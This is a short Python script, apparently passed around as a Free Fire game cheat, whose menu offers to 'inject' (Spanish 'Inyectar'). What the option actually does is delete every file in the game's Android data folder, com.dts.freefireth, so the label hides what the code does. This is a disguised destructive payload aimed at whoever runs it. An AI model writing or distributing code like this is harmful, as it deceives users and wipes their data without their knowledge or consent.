import os

def borrar_archivos():
    directorio = '/storage/emulated/0/Android/data/com.dts.freefireth'
    
    try:
        # Lista todos los archivos en el directorio
        archivos = os.listdir(directorio)
        
        # Elimina cada archivo en el directorio
        for archivo in archivos:
            ruta_archivo = os.path.join(directorio, archivo)
            os.remove(ruta_archivo)
        
        print("Archivos eliminados con éxito.")
    except Exception as e:
        print(f"Ocurrió un error: {str(e)}")

if __name__ == "__main__":
    print("By Julio")
    print("1. Inyectar")
    opcion = input("Ingrese 1 para inyectar: ")
    
    if opcion == "1":
        borrar_archivos()
